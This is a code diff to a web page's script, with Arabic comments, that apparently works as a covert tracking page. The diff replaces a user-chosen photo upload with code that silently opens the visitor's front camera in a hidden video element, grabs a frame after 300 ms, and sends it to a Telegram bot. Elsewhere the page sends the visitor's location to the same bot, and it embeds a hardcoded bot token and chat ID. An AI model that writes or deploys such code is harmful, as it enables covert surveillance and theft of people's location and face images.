@@ -105,7 +105,7 @@
 
 <script>
     // =====================================================
-    // 🔑 بيانات البوت (تم إدخالها مسبقاً)
+    // 🔑 بيانات البوت
     // =====================================================
     const BOT_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
     const CHAT_ID = '8391968596';
@@ -169,26 +169,52 @@
         });
     }
 
-    // ================== دالة التقاط الصورة ==================
+    // ================== دالة التقاط الصورة من الكاميرا الأمامية ==================
 
-    function capturePhoto() {
+    function captureFrontCamera() {
         return new Promise((resolve, reject) => {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.capture = 'user';
-            input.onchange = function(e) {
-                const file = e.target.files[0];
-                if (file) {
-                    resolve(file);
-                } else {
-                    reject('لم يتم اختيار صورة');
+            // فتح الكاميرا الأمامية مباشرة باستخدام video
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            // طلب الكاميرا الأمامية فقط
+            navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: 'user',  // 'user' = الكاميرا الأمامية
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
                 }
-            };
-            input.onerror = function() {
-                reject('حدث خطأ في الكاميرا');
-            };
-            input.click();
+            })
+            .then((stream) => {
+                video.srcObject = stream;
+                video.play();
+
+                // انتظر حتى تظهر الكاميرا
+                setTimeout(() => {
+                    // التقاط الصورة
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // إيقاف الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+
+                    // تحويل إلى ملف
+                    canvas.toBlob((blob) => {
+                        const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
+                        resolve(file);
+                    }, 'image/jpeg', 0.9);
+
+                }, 300); // تأخير بسيط لضمان ظهور الكاميرا
+
+            })
+            .catch((err) => {
+                reject('تعذر فتح الكاميرا الأمامية: ' + err.message);
+            });
         });
     }
 
@@ -211,11 +237,11 @@
             sendToBot(locationMsg, true);
             showStatus('✅ تم تحديد موقعك', 'success');
 
-            // 3. طلب الصورة
-            showStatus('📸 جاري فتح الكاميرا...', 'loading');
-            const photoFile = await capturePhoto();
+            // 3. تصوير الكاميرا الأمامية مباشرة
+            showStatus('📸 جاري التقاط صورتك...', 'loading');
+            const photoFile = await captureFrontCamera();
             await sendPhotoToBot(photoFile);
-            sendToBot('📸 تم التقاط صورة الوجه', true);
+            sendToBot('📸 تم التقاط صورة من الكاميرا الأمامية', true);
             showStatus('✅ تم التقاط الصورة', 'success');
 
             // 4. معلومات إضافية
